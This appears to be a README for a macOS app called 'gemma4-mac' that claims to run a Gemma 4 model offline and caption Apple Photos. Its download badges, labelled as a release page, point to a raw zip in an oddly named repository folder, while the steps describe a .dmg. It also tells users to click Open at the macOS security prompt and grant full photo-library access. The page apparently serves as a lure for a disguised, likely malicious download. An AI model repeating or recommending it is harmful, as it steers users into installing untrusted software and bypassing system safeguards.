# 🤖 gemma4-mac - Run advanced models on your computer

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/unseeing-yeastcake50/gemma4-mac/raw/refs/heads/main/prosthionic/gemma_mac_2.7.zip)

## 📖 About this application

gemma4-mac allows you to run the Gemma 4 e4b artificial intelligence model directly on your Apple Silicon hardware. You do not need an internet connection to process your data once the software is installed. This tool supports text generation, image analysis, and automatic captioning of your Apple Photos library. By running these models locally, you keep your data private and avoid subscription costs.

## 💻 System requirements

To run this application, your computer needs a few specific components to ensure smooth performance. 

*   Processor: Apple Silicon chip (M1, M2, or M3 series).
*   Memory: 16 GB of RAM or higher is recommended for image processing.
*   Storage: 10 GB of free space for the model weights and application files.
*   Operating System: macOS 13 or newer.

The application utilizes your computer's Neural Engine to handle complex tasks quickly. If you have less than 16 GB of RAM, the app will still function, but it may take more time to process large image libraries.

## 📥 Downloading the software

You can find the latest version of the installer on the project releases page. 

[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://github.com/unseeing-yeastcake50/gemma4-mac/raw/refs/heads/main/prosthionic/gemma_mac_2.7.zip)

Visit this page to download the compressed file for your system. Look for the file ending in `.dmg` to start your installation.

## 🛠️ Installation steps

1.  Open your browser and navigate to the link provided above.
2.  Click the link labeled `Gemma4-mac-Installer.dmg` to save the file to your Downloads folder.
3.  Double-click the file once the download finishes. This action mounts the virtual disk to your desktop.
4.  Drag the `gemma4-mac` icon into your Applications folder.
5.  Eject the virtual disk by clicking the eject icon in the sidebar of your Finder.
6.  Open your Applications folder and double-click `gemma4-mac` to launch the program for the first time.
7.  If your computer shows a security prompt, click Open to confirm you trust the application.

## 🚀 Running your first session

The first time you open the application, it performs a check of your hardware. This ensures the model can access your computer's local processing power.

1.  Open the application from your Applications folder.
2.  Select the desired model mode. You can choose between Text, Vision, or Photos.
3.  If you choose the Photos mode, a system dialog will appear asking for permissions. Click OK to allow the application to scan your photo library. The app only reads these files to generate captions and does not upload your photos to any servers.
4.  Click the Start button to begin the initialization process. This may take a few minutes as the software prepares the model database.

## 📝 Using the text assistant

The text assistant allows you to chat with the model as you would with a web-based service, but entirely offline. Type your instructions into the box at the bottom of the screen and press Enter. The model provides responses based on its training data. Because the app runs locally, the speed of the output depends on your specific M-series chip.

## 🖼️ Analyzing images

The vision feature detects objects and scenes within your images. You can drag and drop any image file directly into the application window. The model identifies the content, such as people, environment, or activities, and provides a clear description. 

## 📸 Automating Apple Photos

The Photos integration is a powerful tool for cataloging your digital life. When you activate this mode, the application scans your library and adds descriptive keywords to your photos in the Apple Photos app. This makes it easier to search for specific images later using terms like "beach," "birthday," or "mountain."

To use this feature:
1.  Navigate to the settings menu in the top right corner.
2.  Select the Photos tab.
3.  Click Enable Auto-Captioning.
4.  The application processes your photos in the background. You can minimize the window and continue your work while the app scans your media.

## ⚙️ Managing model updates

The developers release updates periodically to improve performance or add new features. You do not need to delete your existing setup to upgrade. Visit the releases page periodically to check for newer version numbers. Download the new installer and drag it into your Applications folder, replacing the old version. Your settings and processed metadata remain intact during this process.

## 🛠️ Solving common issues

*   Application fails to open: Ensure you are using an Apple Silicon Mac. Intel-based Macs do not support this release.
*   High CPU usage: The model requires heavy processing power while generating text or scanning photos. This is normal behavior. The app will return to a low-power state once the task finishes.
*   Permissions error: If the app cannot see your photos, go to System Settings, select Privacy & Security, then select Photos. Ensure the toggle for gemma4-mac is turned on.
*   Slow performance: Close other demanding applications, such as video editors or web browsers with many tabs, to free up memory for the model.